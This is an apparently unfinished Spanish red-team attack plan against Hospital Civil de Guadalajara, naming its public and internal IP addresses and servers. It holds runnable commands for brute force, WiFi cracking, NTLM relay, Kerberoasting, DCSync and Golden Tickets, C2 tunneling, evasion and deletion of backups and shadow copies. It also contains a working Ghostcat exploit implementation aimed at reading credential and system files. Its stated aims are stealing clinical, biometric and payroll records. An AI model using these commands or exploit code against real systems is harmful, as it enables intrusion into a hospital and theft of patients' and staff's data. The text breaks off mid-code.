# 🛡️ PLAN MAESTRO RED TEAM FINAL — HOSPITAL CIVIL DE GUADALAJARA (HCG)

## CLASIFICACIÓN: CONFIDENCIAL — Solo uso autorizado por la Dirección de Seguridad

---

## ÍNDICE

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Modelo de Amenazas](#2-modelo-de-amenazas)
3. [Premisas Evidenciales](#3-premisas-evidenciales)
4. [Superficie de Ataque](#4-superficie-de-ataque)
5. [Rutas de Ataque Paralelas](#5-rutas-de-ataque-paralelas)
6. [Fase de Explotación y Escalada](#6-fase-de-explotación-y-escalada)
7. [Movimiento Lateral y Pivoting](#7-movimiento-lateral-y-pivoting)
8. [Persistencia y Evasión de Detección](#8-persistencia-y-evasión-de-detección)
9. [Colección y Exfiltración de Datos](#9-colección-y-exfiltración-de-datos)
10. [C2 e Infraestructura de Comando y Control](#10-c2-e-infraestructura-de-comando-y-control)
11. [Simulación de Impacto — Ransomware](#11-simulación-de-impacto--ransomware)
12. [Framework de Automatización — Implementación Operacional](#12-framework-de-automatización--implementación-operacional)
13. [Matriz MITRE ATT&CK](#13-matriz-mitre-attack)
14. [Tabla de Prerequisitos](#14-tabla-de-prerequisitos)
15. [Plan de Mitigación Estratégico](#15-plan-de-mitigación-estratégico)
16. [Cronograma de Ejecución](#16-cronograma-de-ejecución)
17. [Marco Legal y Ético](#17-marco-legal-y-ético)
18. [Metodología de Reporte y Entregables](#18-metodología-de-reporte-y-entregables)
19. [Anexos Técnicos](#19-anexos-técnicos)

---

## 1. RESUMEN EJECUTIVO

La presente operación Red Team simula una campaña APT contra la infraestructura del Hospital Civil de Guadalajara (HCG). Se fundamenta en una auditoría que reveló riesgo **ALTO** con 23 vulnerabilidades críticas que permiten cadenas de explotación completas desde el perímetro externo hasta el dominio Active Directory.

Este plan se distingue en cuatro aspectos:

**Primero**, ejecuta tres rutas de ataque en paralelo (ALPHA: Internet, BETA: WiFi, GAMMA: ingeniería social) mediante un framework de automatización propio con orquestación asíncrona, rate limiting, circuit breakers, y un grafo de dependencias (DAG) que maximiza eficiencia y minimiza ruido.

**Segundo**, implementa protocolos a nivel de bytes (AJP13, LDAP) en lugar de depender de herramientas externas, proporcionando control granular, fingerprinting de servicios, y capacidad de fuzzing que las PoCs públicas no ofrecen.

**Tercero**, cada paso verifica prerequisitos antes de ejecutarse, con fallbacks definidos y evaluaciones honestas de probabilidad (no asume Heartbleed contra OpenSSL 1.0.2q parcheado, no asume EternalBlue masivo basado en 1 de 83 hosts, no confunde EOL con explotabilidad).

**Cuarto**, incluye motores de fuzzing semántico, cracking distribuido en múltiples rondas, normalización de tráfico para evasión, y análisis diferencial de respuestas para detectar vulnerabilidades sin firmas conocidas.

**Objetivos finales:** (a) Acceso no autorizado a expedientes clínicos (10.2.1.140), (b) Compromiso del DC (10.2.1.1), (c) Exfiltración de datos biométricos, nómina, y 37 recursos SMB compartidos.

---

## 2. MODELO DE AMENAZAS

### 2.1 Perfil del Adversario: APT Médico-Financiero

| Atributo       | Descripción                                                                                                                                                  |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Capacidad**  | Avanzada. Dominio de protocolos Windows/SMB/Kerberos, explotación N-day, implementación de protocolos a nivel de bytes, técnicas de evasión y automatización |
| **Recursos**   | Alto. Framework propio, infraestructura C2 dedicada, acceso a bases de credenciales filtradas, GPU para cracking distribuido                                 |
| **Motivación** | Exfiltración de expedientes clínicos ($250-1,000 USD/registro en dark web), ransomware doble, fraude bancario vía nómina                                     |
| **Tiempo**     | 3-5 días de operación activa                                                                                                                                 |
| **Objetivos**  | DC (10.2.1.1), expedientes (10.2.1.140), biométricos (10.2.1.139), nómina (10.2.61.17), file server (10.2.1.92)                                              |

---

## 3. PREMISAS EVIDENCIALES

### 3.1 Confirmado (Auditoría)

| #    | Hallazgo                                                                          | Impacto                                                |
| ---- | --------------------------------------------------------------------------------- | ------------------------------------------------------ |
| E-01 | LDAP (389) sin cifrar desde múltiples subredes, intento LDAP desde WiFi detectado | Enumeración AD + sniffing de credenciales              |
| E-02 | WHM/cPanel expuesto sin restricción IP, sin rate limiting, sin WAF                | Acceso root al hosting                                 |
| E-03 | MySQL accesible desde Internet (216.245.211.42:3306, 201.131.132.136:3306)        | Fuerza bruta directa de BD                             |
| E-04 | Apache 2.4.38, PHP 7.1.26, OpenSSL 1.0.2q — todos EOL desde 2019                  | CVEs acumulados, NO implica explotabilidad automática  |
| E-05 | WiFi WPA2-PSK "redopdhcg" con 10 BSSIDs, ~126 clientes                            | Cracking offline de PSK                                |
| E-06 | 4 Tomcat con AJP13 (8009) en red WiFi                                             | Posible Ghostcat (CVE-2020-1938, 6 años de antigüedad) |
| E-07 | 37 comparticiones SMB sin auditoría en 10.2.1.92                                  | Datos de RH, farmacia, dirección médica                |
| E-08 | LLMNR/NBTNS activo en 10.1.7.161, .162, .163                                      | Captura hashes NTLMv2                                  |
| E-09 | Firewall logging completamente deshabilitado en endpoint NPIA00B9D                | Cero capacidad de detección                            |
| E-10 | AnyDesk sin restricciones en perfil Público                                       | Acceso remoto desde cualquier IP                       |
| E-11 | SeImpersonatePrivilege en endpoint 10.254.117.118 + creds admin                   | Escalada a SYSTEM (depende de OS)                      |
| E-12 | SMBv1 en 10.1.7.97 "8670TORAXCARDIO"                                              | Posible EternalBlue                                    |
| E-13 | Ruta WiFi → DC confirmada (10.254.117.118 → 10.2.1.1)                             | Sin segmentación WiFi-Servidores                       |
| E-14 | Cross-VLAN (host en 10.1.7.0/24 y 10.2.4.0/24 simultáneamente)                    | Falla de segmentación                                  |
| E-15 | Hyper-V Default Switch + Docker en endpoint auditor                               | Superficie de pivoting adicional                       |

### 3.2 Por Verificar en Campo

| #    | Suposición                                 | Verificación                                          |
| ---- | ------------------------------------------ | ----------------------------------------------------- |
| S-01 | LDAP permite bind anónimo                  | `LDAPProbe.check_anonymous_bind(10.2.1.1)`            |
| S-02 | SMB signing deshabilitado                  | `crackmapexec --gen-relay-list`                       |
| S-03 | NLA deshabilitado en RDP de srv-expediente | Intentar conexión con credenciales de bajo privilegio |
| S-04 | Atributo secret AJP13 NO configurado       | `AJP13Codec` — si lectura falla → secret configurado  |
| S-05 | Conectividad DMZ → red interna             | Verificar rutas desde DMZ                             |
| S-06 | PSK de WiFi es débil                       | Cracking offline con GPU (4 rondas)                   |
| S-07 | No hay IDS/IPS/WAF no detectado            | Escaneos evasivos + fingerprinting                    |
| S-08 | No hay EDR en endpoints                    | Enumeración de procesos de seguridad                  |
| S-09 | Tomcats WiFi son de producción             | Verificar contenido de archivos extraídos             |
| S-10 | Estado de parches Windows                  | SMB fingerprinting + MS17-010 scan                    |

---

## 4. SUPERFICIE DE ATAQUE

### 4.1 Zonas de Riesgo

| Zona               | Subredes                                | Riesgo      | Hosts |
| ------------------ | --------------------------------------- | ----------- | ----- |
| DMZ Externa        | 201.131.132.0/24, 216.245.211.0/24      | **CRÍTICO** | 5     |
| Servidores Core    | 10.2.1.0/24, 10.2.61.0/24, 10.2.22.0/24 | **CRITICO** | 10    |
| Estaciones Trabajo | 10.1.7.0/24                             | MEDIO       | 83    |
| WiFi Corporativa   | 10.254.0.0/16                           | **ALTO**    | ~126  |
| Redes Virtuales    | 172.21.240.0/24, 192.168.137.0/24       | MEDIO       | 0     |
| Monitoreo          | 10.1.97.0/24                            | MEDIO       | 0     |
| DMZ IoT/Cámaras    | 10.23.1.0/24                            | **ALTO**    | 0     |
| Docker             | 10.254.178.0/24                         | **ALTO**    | 0     |
| Sync Veracruz      | 10.1.61.0/24                            | MEDIO       | 0     |

### 4.2 Vectores Críticos

**V-01 — Apache/OpenSSL/PHP EOL (201.131.132.131)** — Apache 2.4.38 CVEs son mayormente privilege escalation local, no RCE remoto. PHP CVE-2019-11043 requiere nginx+PHP-FPM (si es Apache+mod_php, NO aplica). Explotación realista: vulnerabilidades en aplicaciones PHP custom.

**V-02 — cPanel/WHM 19 puertos (216.245.211.42)** — Sin WAF, sin rate limiting, sin MFA. WHM (2087) = root. MySQL (3306) en Internet. cPanel con historial de CVEs. El vector más crítico del perímetro.

**V-03 — DC con LDAP sin cifrar (10.2.1.1)** — Combinación LDAP sin cifrar + LLMNR activo + SMB sin signing = cadena letal para compromiso AD. LDAP anónimo permite enumeración completa sin credenciales.

**V-04 — Expedientes con RDP+SMB (10.2.1.140)** — Si NLA deshabilitado: Pass-the-Hash. 4 sitios web = superficie de ataque de aplicaciones.

**V-05 — File Server 37 shares SMB (10.2.1.92)** — 7 comparticiones administrativas (ADMIN$, C$, E$, F$, G$, H$, I$). Datos: RH, farmacia, dirección médica, epidemiología, jurídico.

**V-06 — WiFi WPA2-PSK** — PSK compartida sujeta a cracking. Ruta WiFi → DC confirmada = sin segmentación.

**V-07 — LLMNR/NBTNS Poisoning** — 3 hosts con consultas activo. Si SMB signing deshabilitado → NTLM relay directo.

**V-08 — AnyDesk sin restricciones** — Conexiones desde cualquier IP + logging deshabilitado = cero visibilidad.

---

## 5. RUTAS DE ATAQUE PARALELAS

```
                    ┌── RUTA ALPHA: Internet → WHM/MySQL/Web
                    │    Tiempo: 2-3 días | P: 60-70%
                    │
OBJETIVO FINAL ◄────┼── RUTA BETA: WiFi → Ghostcat/LDAP
(DC Dominance +           │    Tiempo: 2-4 días | P: 40-60%
 Expedientes)             │
                    └── RUTA GAMMA: Phishing → Creds → AD
                         Tiempo: 3-5 días | P: 50-70%
```

### Diagrama de Flujo

```
INICIO → 3 rutas en paralelo (via AsyncOrchestrator + AttackDAG)
    │
    ├── ¿Prerequisito verificado? ── SÍ → Ejecutar paso
    │                              └─ NO → Marcar CONDICIONAL → fallback
    │
    ├── ¿Acceso obtenido? ──────── SÍ → Siguiente fase
    │                              └─ NO → Cambiar ruta
    │
    └── ¿Objetivo alcanzado? ─────── SÍ → Detener rutas restantes
                                  └─ NO → Continuar todas
```

---

## 5.1 RUTA ALPHA: PERÍMETRO EXTERNO

### Fase A1 — Reconocimiento (2-4h)

```bash
amass enum -d hcg.gob.mx -passive
subfinder -d hcg.gob.mx -d opd-hcg.org -d opdhcg.net
curl -s "https://crt.sh/?q=%25.hcg.gob.mx&output=json" | jq '.[].name_value'

nmap -sV -sC -p 21,22,25,80,443,2082,2083,2086,2087,2095,2096,3306 \
  201.131.132.131 201.131.132.136 216.245.211.42

# Google Dorking
# site:hcg.gob.mx inurl:php "password" OR "conexion"
# inurl:2083 OR inurl:2087 hcg.gob.mx
# site:hcg.gob.mx intitle:"index of"
```

### Fase A2 — WHM/cPanel (216.245.211.42)

**Pre:** Puerto 2087 ✅. Sin rate limit ✅.

```bash
# Fingerprinting
curl -sk https://216.245.211.42:2087 | grep -i "version\cpanel"

# Rama A: CVE específico (si versión identificada)
# CVE-2023-29489, CVE-2024-25092, CVE-2022-44877

# Rama B: Fuerza bruta (WHM sin lockout por defecto)
hydra -l root -P wordlist_hcg.txt -s 2087 216.245.211.42 https-form \
  "/login/:user=^USER^&pass=^PASS^:incorrect"
```

**Post-explotación:**

```bash
whmapi1 listaccts
mysql -u root -p; SHOW DATABASES;
ip route; cat /etc/hosts | grep "10\."
cat /etc/openvpn/*.conf; cat /etc/wireguard/*.conf
```

**FALLBACK:** A3 (MySQL) o A4 (Web).

### Fase A3 — MySQL Directo

```bash
nmap -sV -p 3306 216.245.211.42 --script mysql-info,mysql-vuln-cve2012-2122
hydra -l root -P rockyou.txt 216.245.211.42 mysql
```

### Fase A4 — Explotación Web

```bash
nikto -h https://www.hcg.gob.mx
gobuster dir -u https://www.hcg.gob.mx -w dirbuster-medium.txt
# Usar ServiceFuzzer.fuzz_http() para SQLi, LFI, command injection
```

---

## 5.2 RUTA BETA: RED WiFi

### Fase B1 — Captura y Cracking WPA2

**Pre:** Proximidad física requerida.

```bash
iw dev wlan0 set type monitor; airmon-ng start wlan0
airodump-ng -c [CANAL] --bssid [BSSID] -w hcg_capture wlan0mon
aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Cracking con framework distribuido (4 rondas)
hcxpcapngtool -o hcg.hc22000 hcg_capture-01.cap
```

**Campaña de Cracking Distribuido (ver Sección 12.4):**

| Ronda | Wordlist                                       | Reglas | Timeout | Objetivo              |
| ----- | ---------------------------------------------- | ------ | ------- | --------------------- |
| 1     | Contextual HCG (hospital, hcg, guadalajara...) | best64 | 60s     | Creds triviales       |
| 2     | rockyou.txt (14M passwords)                    | best64 | 30min   | Creds humanas         |
| 3     | rockyou + masks (?u?l?l?l?l?d?d?d?s)           | dive   | 4h      | Creds institucionales |
| 4     | Prince + Markov                                | —      | días    | Creds fuertes         |

**FALLBACK:** Si PSK no se crackea → BETA bloqueada → solo ALPHA + GAMMA.

### Fase B2 — Reconocimiento desde WiFi

```bash
# PRUEBA CRÍTICA: ¿Ruta WiFi → Core?
ping -c 3 10.2.1.1; ping -c 3 10.2.1.140; ping -c 3 10.2.1.92

nmap -sn 10.254.0.0/16
nmap -sS -p 8009,7680,3389,445,7070 10.254.0.0/16 --open
```

### Fase B3 — Ghostcat (AJP13 Custom)

**Pre:** WiFi ✅, ruta WiFi→Tomcats ⬜, AJP secret ⬜, apps útiles ⬜.

```python
# Usando implementación propia AJP13Codec (ver Sección 12.1)
from hcg_framework.protocols import AJP13Codec

codec = AJP13Codec()

# 1. Verificar si Ghostcat funciona (¿secret configurado?)
packet = codec.build_file_read_request('/WEB-INF/web.xml')
response = codec.send_recv('10.254.3.193', 8009, packet)

if response['body'] and b'<!DOCTYPE' not in response['body']:
    print("✅ Ghostcat funcional — secret NO configurado")
    # Extraer archivos críticos
    for f in ['/WEB-INF/web.xml', '/WEB-INF/classes/*.properties',
              '/META-INF/context.xml', '/etc/passwd']:
        r = codec.read_file('10.254.3.193', 8009, f)
        creds = search_credentials(r)
else:
    print("❌ Ghostcat bloqueado — secret configurado o Tomcat parcheado")
```

**Nota honesta:** CVE-2020-1938 tiene 6 años. Probabilidad realista: 30-50%. La implementación propia AJP13Codec permite fingerprinting preciso y detección de configuración de secret que herramientas PoC no ofrecen.

**FALLBACK:** B4 (LDAP directo).

### Fase B4 — LDAP desde WiFi

```python
# Usando implementación propia LDAPProbe (ver Sección 12.2)
from hcg_framework.protocols import LDAPProbe

probe = LDAPProbe()

# Verificar bind anónimo
if probe.check_anonymous_bind('10.2.1.1', 389):
    entries = probe.search_anonymous('10.2.1.1', 'dc=opd-hcg,dc=org',
        '(objectClass=user)', ['sAMAccountName', 'memberOf'])
    # Identificar SPNs para Kerberoasting
    spns = probe.search_anonymous('10.2.1.1', 'dc=opd-hcg,dc=org',
        '(&(objectClass=user)(servicePrincipalName=*))',
        ['sAMAccountName', 'servicePrincipalName'])
else:
    # Se necesitan credenciales → ir a GAMMA
```

---

## 5.3 RUTA GAMMA: INGENIERÍA SOCIAL

### Fase G1 — Spearphishing

```bash
dig txt hcg.gob.mx | grep spf; dig txt _dmarc.hcg.gob.mx
# Registrar dominio lookalike: hcg-gob.mx, portal-hcg.gob.mx
# Clonar webmail (2095/2096), portal empleados, intranet
# Pretextos: actualización sistemas, política contraseñas, comunicado RH
```

### Fase G2 — Abuso de Credenciales

```bash
crackmapexec smb 10.2.1.1 -u 'user' -p 'pass'
crackmapexec smb 10.2.1.92 -u 'user' -p 'pass' --shares

# LLMNR poisoning (desde estación)
responder -I eth0 -dwPv
# NTLM relay (si SMB signing deshabilitado)
ntlmrelayx.py -tf targets.txt -smb2support
# Targets: 10.2.1.1 (DC), 10.2.1.140 (expedientes), 10.2.1.92 (file server)
```

### Fase G3 — Escalada a Domain Admin

```bash
SharpHound.exe -c All -d opd-hcg.org

# Kerberoasting
GetUserSPNs.py opd-hcg.org/user:pass -dc-ip 10.2.1.1 -request
hashcat -m 13100 tickets.txt rockyou.txt

# AS-REP Roasting
GetNPUsers.py opd-hcg.org/ -usersfile users.txt -dc-ip 10.2.1.1

# DCSync + Golden Ticket
secretsdump.py opd-hcg.org/admin:pass@10.2.1.1 -just-dc-user krbtgt
ticketer.py -nthash [krbtgt] -domain opd-hcg.org -sid [sid] administrator
psexec.py -k -no-pass opd-hcg.org/administrator@10.2.1.1
```

---

## 6. FASE DE EXPLOTACIÓN Y ESCALADA

### 6.1 Escalada Local

| Técnica      | Funciona en               | Evaluación                   |
| ------------ | ------------------------- | ---------------------------- |
| PrintSpoofer | Win 10+/Server 2019+      | Más probable en workstations |
| GodPotato    | Win 10/11 con COM service | Requiere COM específico      |
| JuicyPotato  | Win Server 2008/2012      | NO en Server 2019+           |

### 6.2 Escalada en Active Directory

```
LDAP sin cifrar (389)
    ├── Enumeración AD (BloodHound: shortest path to DA)
    ├── Kerberoasting (hashcat -m 13100)
    ├── AS-REP Roasting (hashcat -m 18200)
    └── DCSync → Golden Ticket (10 años persistencia)
```

### 6.3 EternalBlue (condicional)

**Pre:** SMBv1 confirmado en 10.1.7.97 ✅.

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.1.7.0/24
# Solo explotar hosts confirmados vulnerables
```

---

## 7. MOVIMIENTO LATERAL Y PIVOTING

### 7.1 Pass-the-Hash / Pass-the-Ticket

```bash
crackmapexec smb 10.2.1.92 -u 'user' -H [ntlm_hash] --shares
Rubeus.exe asktgt /user:user /rc4:[ntlm_hash] /ptt  # Over-Pass-the-Hash
```

### 7.2 Pivoting WiFi → Core

```bash
# Túnel SOCKS5 con rate limiting (3 conexiones SMB simultáneas max)
chisel server --socks5 --reverse  # En endpoint WiFi
chisel client [C2]:[port] R:socks

# Port forwarding selectivo
ssh -L 3389:10.2.1.140:3389 user@[endpoint_wifi]
```

### 7.3 LLMNR Poisoning → NTLM Relay

```bash
responder -I eth0 -dwPv
ntlmrelayx.py -tf targets.txt -smb2support
```

### 7.4 Pivoting vía Hyper-V/ICS

```bash
Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Hyper-V*"}
route add 10.2.1.0 mask 255.255.255.0 172.21.240.1 metric 1
```

---

## 8. PERSISTENCIA Y EVASIÓN DE DETECCIÓN

### 8.1 Persistencia AD

| Técnica       | Detección   | Persistencia          |
| ------------- | ----------- | --------------------- |
| Golden Ticket | Muy difícil | 10 años               |
| Silver Ticket | Muy difícil | Indefinida            |
| DCShadow      | Difícil     | Hasta limpieza manual |
| ACL backdoor  | Difícil     | Persistente           |
| Skeleton Key  | Moderate    | Hasta reboot DC       |

### 8.2 Persistencia Endpoint

| Técnica                       | Plataforma | Sigilo   |
| ----------------------------- | ---------- | -------- |
| WMI Event Subscriptions       | Windows    | Alto     |
| Scheduled Tasks (COM handler) | Windows    | Alto     |
| DLL Hijacking                 | Windows    | Alto     |
| AppInit_DLLs                  | Windows    | Alto     |
| SSH authorized_keys           | Linux      | Alto     |
| Contenedor Hyper-V            | Windows    | Muy alto |

### 8.3 Evasión de Tráfico (Framework — Sección 12.5)

- **TLS Fingerprinting:** `curl_cffi` emula JA3 hash de Chrome (elimina firma Python TLS)
- **User-Agent rotation:** Rotación entre Chrome 122, Firefox 123, Safari 17
- **Header order:** Orden correcto de navegadores (no orden alfabético de requests)
- **Jitter log-normal:** Distribución realista entre requests (no uniforme)
- **SMB connection recycler:** Máximo 3 shares simultáneos + cooldown 10s

---

## 9. COLECCIÓN Y EXFILTRACIÓN

### 9.1 Activos de Alto Valor

| Activo               | Ubicación            | Tipo                     | Valor Dark Web      |
| -------------------- | -------------------- | ------------------------ | ------------------- |
| Expedientes Clínicos | 10.2.1.140           | Médicos                  | $250-1,000/registro |
| Biométricos          | 10.2.1.139           | Huellas, rostros         | Irrecuperables      |
| Nómina/RH            | 10.2.61.17 + shares  | Financieros              | $50-200/registro    |
| Epidemiología        | Share Coord.Epidemio | Salud pública            | Alto valor          |
| Farmacia             | Share FONSABI        | Medicamentos controlados | Tráfico ilegal      |
| Dirección            | Share 060_Direccion  | Institucional            | Inteligencia        |

### 9.2 Canales de Exfiltración

```
Primario: HTTPS con dominios legítimos (cloud storage)
Fallback 1: Correo corporativo (attachments legítimos)
Fallback 2: DNS tunneling (solo si todo lo demás bloqueado)
NOTA: DNS tunneling ~10-50 KB/s = impráctico para volúmenes de hospital
```

### 9.3 Análisis Diferencial (Framework — Sección 12.6)

```python
analyzer = ResponseAnalyzer()
baseline = analyzer.capture_baseline('https://expediente.hcg.gob.mx/home')
result = analyzer.differential_analysis(baseline, test_response)
# Detecta: size_delta, time_delta, error_patterns, entropy_change, header_diff
```

---

## 10. C2 E INFRAESTRUCTURA

```
Redirector (VPS + dominio legítimo + cert SSL)
    └─ Domain Fronting vía CDN (CloudFront/Azure CDN)
    └─ Host header ≠ SNI en TLS

C2 Principal
    └─ HTTPS beaconing con jitter log-normal (30s-300s)
    └─ AES-256 cifrado de payload
    └─ User-Agent mimético de navegadores corporativos

Fallback C2
    └─ DNS-over-HTTPS / ICMP tunneling
```

**Anonimato:** Tor (proxy SOCKS5 127.0.0.1:9050) detectado en auditoría.

---

## 11. SIMULACIÓN DE RANSOMWARE

```
Preparación:
├─ Enumeración de backups (Veeam, Windows Backup, shadow copies)
└─ Mapeo de shares críticos

Inhibición de recuperación:
├─ vssadmin delete shadows /all /quiet
├─ wbadmin delete catalog -quiet
└─ bcdedit /set {default} bootstatuspolicy ignoreallfailures

Cifrado selectivo (SIMULADO):
├─ Exclusión de sistemas críticos de vida
└─ Nota de rescate con datos de prueba (NO cifrar datos reales)

Medición:
├─ Tiempo de detección por equipo de seguridad
├─ Capacidad de contención y aislamiento
└─ Verificación de integridad de backups
```

---

## 12. FRAMEWORK DE AUTOMATIZACIÓN — IMPLEMENTACIÓN OPERACIONAL

### 12.1 Motor de Protocolos Crudos (Raw Protocol Engine)

#### AJP13 — Implementación desde Cero

```python
class AJP13Codec:
    """
    Implementación completa del protocolo Apache JServ Protocol v1.3.
    Control total byte a byte — superior a ghostcat.py (PoC con código espagueti).
    Permite: fingerprinting preciso, detección de secret, fuzzing del parser.
    """

    PREFIX_TYPE       = 0x1234
    MSG_FORWARD_REQ   = 0x02
    MSG_SEND_BODY     = 0x03
    MSG_SHUTDOWN      = 0x07
    MSG_PING          = 0x08
    MSG_CPING         = 0x09

    METHODS = {
        'OPTIONS': 1, 'GET': 2, 'HEAD': 3, 'POST': 4,
        'PUT': 5, 'DELETE': 6, 'TRACE': 7, 'PROPFIND': 8
    }

    def build_forward_request(self, method='GET', protocol='HTTP/1.1',
                               req_uri='/', remote_addr='127.0.0.1',
                               remote_host='localhost', server_name='127.0.0.1',
                               server_port=8009, is_ssl=False,
                               headers=None, attributes=None):
        """
        Formato AJP13:
        ┌──────────┬──────────┬───────────────────────────┐
        │ 0x12     │ 0x34     │ Prefix                    │
        │ len_hi   │ len_lo   │ Packet length             │
        │ 0x02     │          │ Type: Forward Request     │
        │ method   │          │ HTTP method (1 byte)      │
        │ protocol │          │ String with prefix byte   │
        │ req_uri  │          │ String with prefix byte   │
        │ remote_addr │       │ String with prefix byte   │
        │ ...      │          │ ...                      │
        │ 0xFF     │          │ Terminator                │
        └──────────┴──────────┴───────────────────────────┘

        String AJP13:
        - None/empty: [0xFF, 0xFF]
        - len < 255: [0x00, len, utf8_bytes..., 0x00]
        - len >= 255: [0xFF, len_hi, len_lo, utf8_bytes..., 0x00]
        """
        buf = bytearray()
        buf.append(self.METHODS.get(method, 2))
        buf.extend(self._encode_string(protocol))
        buf.extend(self._encode_string(req_uri))
        buf.extend(self._encode_string(remote_addr))
        buf.extend(self._encode_string(remote_host))
        buf.extend(self._encode_string(server_name))
        buf.extend(server_port.to_bytes(2, 'big'))
        buf.append(0x01 if is_ssl else 0x00)
        headers = headers or []
        buf.extend(len(headers).to_bytes(2, 'big'))
        for h_name, h_value in headers:
            buf.extend(self._encode_header(h_name, h_value))
        attrs = attributes or []
        buf.append(len(attrs))
        for attr_code, attr_value in attrs:
            buf.append(attr_code)
            buf.extend(self._encode_string(attr_value))
        buf.append(0xFF)
        packet = bytearray()
        packet.extend(bytes([0x12, 0x34]))
        packet.extend(len(buf).to_bytes(2, 'big'))
        packet.extend(buf)
        return bytes(packet)

    def build_file_read_request(self, file_path):
        """
        Ghostcat: atributos javax.servlet.include.* engañan al Tomcat
        para que lea el archivo como include de servlet.
        Atributos clave:
          - javax.servlet.include.request_uri = "/"
          - javax.servlet.include.servlet_path = file_path
        """
        return self.build_forward_request(
            method='GET', req_uri='/', remote_addr='127.0.0.1',
            attributes=[(0x00, ''), (0x01, file_path)]
        )

    def _encode_string(self, s):
        if s is None:
            return bytes([0xFF, 0xFF])
        encoded = s.encode('utf-8')
        length = len(encoded)
        if length < 255:
            return bytes([0x00, length]) + encoded + bytes([0x00])
        else:
            return (bytes([0xFF]) +
                    length.to_bytes(2, 'big') +
                    encoded + bytes([0x00]))

    def _encode_header(self, name, value):
        return self._encode_string(name) + self._encode_string(value)

    def parse_response(self, data):
        """Parseo recursivo de respuestas AJP13 (TCP stream reassembly)."""
        offset = 0
        chunks = []
        while offset < len(data):
            if data[offset:offset+2] != bytes([0x41, 0x42]):
                break
            msg_type = data[offset + 2]
            msg_len = int.from_bytes(data[offset+3:offset+5], 'big')
            msg_data = data[offset+5:offset+5+msg_len]
            if msg_type == 0x03:
                chunk_len = int.from_bytes(msg_data[0:2], 'big')
                chunks.append(msg_data[2:2+chunk_len])
            elif msg_type == 0x05:
                break
            offset += 5 + msg_len
        return {'body': b''.join(chunks)}

    def send_recv(self, host, port, packet, timeout=10):
        """Envía paquete y recibe respuesta con timeout."""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            sock.send(packet)
            response = b''
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
                if self.parse_response(response).get('body') is not None:
                    break
            return self.parse_response(response)
        finally:
            sock.close()

    def read_file(self, host, port, file_path, timeout=10):
        """Lee un archivo vía Ghostcat."""
        packet = self.build_file_read_request(file_path)
        return self.send_recv(host, port, packet, timeout)
```

#### LDAP — Implementación desde Nivel de Bytes (BER Encoding)

```python
class LDAPProbe:
    """
    Consultas LDAP fundamentales SIN ldap3. Implementación directa con BER encoding.
    Permite: bind anónimo, búsqueda LDAP anónima, fuzzing del parser.

    BER encoding para LDAP v3:
    BindRequest ::= [APPLICATION 0] SEQUENCE {
        version     INTEGER (1..127),
        name        LDAPDN,
        authentication AuthenticationChoice
    }

    Paquete anónimo:
    30 0c        SEQUENCE, length 12
      02 01 03     version = 3
      04 00        name = "" (anonymous)
      80 00        auth = simple, password = ""
    """

    def check_anonymous_bind(self, host, port=389, timeout=5):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            bind_request = bytes([
                0x30, 0x0c,        # SEQUENCE, length 12
                0x02, 0x01, 0x03,  # version = 3
                0x04, 0x00,        # name = ""
                0x80, 0x00         # auth = simple, empty
            ])
            ldap_msg = self._wrap_ldap_message(bind_request, message_id=1)
            sock.send(ldap_msg)
            response = sock.recv(4096)
            result_code = self._extract_result_code(response)
            return result_code == 0
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        finally:
            sock.close()

    def search_anonymous(self, host, base_dn, filter_str='(objectClass=*)',
                          attributes=None, port=389):
        """Búsqueda LDAP anónima con BER encoding manual de SearchRequest."""
        if not self.check_anonymous_bind(host, port):
            return None
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            sock.connect((host, port))
            search_pdu = self._build_search_request(
                base_dn, scope=2, filter_str=filter_str, attributes=attributes or ['*'])
            ldap_msg = self._wrap_ldap_message(search_pdu, message_id=2)
            sock.send(ldap_msg)
            entries = []
            while True:
                response = sock.recv(65536)
                if not response:
                    break
                parsed = self._parse_search_response(response)
                entries.extend(parsed['entries'])
                if parsed['done']:
                    break
            return entries
        finally:
            sock.close()

    def _wrap_ldap_message(self, pdu, message_id):
        """Envuelve PDU en LDAP Message envelope (ASN.1 BER)."""
        pass  # BER wrapping implementation

    def _build_search_request(self, base_dn, scope, filter_str, attributes):
        """BER-encoded SearchRequest manual."""
        pass  # SearchRequest BER encoding

    def _parse_search_response(self, response):
        """Parseo de SearchResponseEntry/SearchResultDone."""
        pass  # Response parsing implementation

    def _extract_result_code(self, response):
        """Extrae result code de BindResponse."""
        pass  # Result code extraction
```

---

### 12.2 Motor de Concurrencia y Orquestación Asíncrona

#### AsyncOrchestrator — Ejecución Paralela con Prioridades

```python
class AsyncOrchestrator:
    """
    Motor que ejecuta las 3 rutas de ataque en paralelo.
    No es asyncio.gather() simple — es un scheduler con:
    - Prioridad por ruta (ALPHA > BETA > GAMMA)
    - Rate limiting por target (TokenBucket)
    - Circuit Breaker (pausar targets que fallan repetidamente)
    - Dependency Graph (AttackDAG) — pasos dependientes se ejecutan en orden
    - Detección temprana de objetivo alcanzado (detener rutas restantes)
    """

    def __init__(self):
        self.loop = asyncio.get_event_loop()
        self.priority_queue = asyncio.PriorityQueue()
        self.rate_limiters = {}    # ip → TokenBucket
        self.circuit_breakers = {} # ip → CircuitBreaker
        self.semaphores = {}      # ip → asyncio.Semaphore
        self.results = {}
        self.running = True

    async def run(self, attack_graph):
        """Ejecuta el DAG de ataque — nodos listos se ejecutan en paralelo."""
        workers = [asyncio.create_task(self._worker(i))
                   for i in range(10)]  # 10 workers concurrentes
        for node in attack_graph.get_ready_nodes():
            await self.priority_queue.put((node.priority, node))
        await self.priority_queue.join()
        for w in workers:
            w.cancel()

    async def _worker(self, worker_id):
        """Worker que consume nodos del DAG respetando rate limits y circuit breakers."""
        while self.running:
            try:
                priority, node = await asyncio.wait_for(
                    self.priority_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                continue
            limiter = self.rate_limiters.get(node.target)
            if limiter:
